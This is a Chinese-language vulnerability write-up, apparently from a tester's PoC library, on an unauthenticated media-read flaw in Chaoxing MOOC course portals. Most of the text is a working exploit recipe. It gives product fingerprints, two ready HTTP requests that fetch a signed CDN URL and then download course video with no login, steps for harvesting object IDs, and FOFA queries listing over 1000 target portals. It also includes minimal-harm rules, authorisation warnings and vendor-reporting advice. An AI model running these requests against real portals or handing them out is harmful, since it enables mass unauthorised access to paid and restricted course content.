# 超星慕课-课程媒体对象未授权读-任意下载

> 指纹：超星（Chaoxing）学习通/慕课 `mooc-ans`/`course-ans` 课程门户，对象读接口 `/mooc-ans/ueditorupload/read` 对 objectId **不做登录态/选课成员/对象归属/公开性校验**，未登录即可取 cldisk 签名地址并全量下载课程媒体原文（绕过选课鉴权）。命中以下任一特征即开本文件。

## 一眼识别
- 页面/后端含 `mooc-ans`、`course-ans`、`ueditorupload` 路径；`Server: CXS`（超星自研反代）
- 对象存超星全局 CDN `*.cldisk.com`，签名参数 `at_=/ak_=/ad_=`；另有 `p.ananas.chaoxing.com`
- 门户域名典型形如 `mooc1.<校域>.edu.cn` / `fanya.<校域>`；课程资源页 HTML 明文明文输出多个 `publishViewObjectId="<24位hex>"`（对象 ID 即泄漏钥匙）
- SSO/滑块走 `captcha.chaoxing.com` / `passport2`；多租户共享超星公共 IP（常用 `45.113.20.x`）

## 已验证 PoC
（占位：`<HOST>` 换目标门户，如 `mooc1.<校域>`；`<OBJECT_ID>` 换 24 位 hex objectId。**本库不存实值/密钥/会话**。任一报文都不需 Cookie/登录态。）

### ① 未登录取签名地址（核心判据枪）
```http
GET /mooc-ans/ueditorupload/read?objectId=<OBJECT_ID> HTTP/1.1
Host: <HOST>
Connection: close
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9
```
**判据**：回 200 且响应 HTML 含 `<scheme>://s<digit>.cldisk.com/<缩略路径>/<OBJECT_ID>/…mp4?at_=<n>&ak_=<hex>&ad_=<hex>` 完整签名 URL（`jrose/k8s/route` cookie 只是负载均衡，非登录态）→ 该对象属未授权可得。

### ② 携带签名地址、不带 Cookie 直下媒体
```http
GET /sv-*/<类型>/cc/<OBJECT_ID>/sd.mp4?at_=<time>&ak_=<hex>&ad_=<hex> HTTP/1.1
Host: s<digit>.cldisk.com
Connection: close
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36
Accept: */*
Accept-Encoding: identity
Accept-Language: zh-CN,zh;q=0.9
Referer: http://<HOST>/mooc-ans/ueditorupload/read?objectId=<OBJECT_ID>
Sec-Fetch-Dest: video
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: cross-site
```
**判据**：回 200（或 Range 206）+ `Content-Type: video/mp4`，正文前 16 字节含 `….ftyp….`（`66 74 79 70`）→ 未授权取到完整媒体字节。已验证：公开课视频对象端到端取到整段全量（72.4MB）。

## 替换点说明
| 占位 | 怎么拿 |
|------|--------|
| `<HOST>` | 目标超星慕课门户，如 `mooc1.<校域>`（FOFA `body="mooc-ans"` 成批拉） |
| `<OBJECT_ID>` | 课程资源页源码 `publishViewObjectId="<24位hex>"`；或已公开对象资源接口响应 |
| `<时间戳>/<hex>` | 由①返回的签名 URL 原样带入，时效内有效，无需另取 |

## 最小伤害证明
- 判据只到「读到签名地址」或「Range 前 1MB 见 MP4 魔数」为止，**不全量下载**；明文泄漏的公开课对象够判"未授权可读"，私有/学员对象不碰（该校私有对象 objectId 未公开即不可批量枚举）
- 只证明读，不做对象枚举/批量拉取/写操作，取流不带任何账号写坏状态
- `objectId` 保密即安全、一旦泄漏即被拉 → 漏洞成立不依赖登录，越权面大

## 备注（可选）
- **归属产品层**：路径/对象库/签名全是超星产品代码（`mooc-ans`/`course-ans`/UEditor、`*.cldisk.com`），全国高校租户同套 → 修复需超星改 `read` 鉴权 + cldisk 签名绑定会话；学校侧难自修。报送走超星/学习通 SR 或厂商，比单校更有效。
- FOFA 通杀面：`body="mooc-ans"` 全国 1000+ 条，`mooc1.*` 慕课门户数百个，`.edu.cn` 高校也在列（多数共享 `45.113.20.x` CDN）。跨校验证需单校授权，未授权不要主动打别校。
- 版本可漂但指纹稳定：改入口域名/加登录壳不改变 `ueditorupload/read` 本体。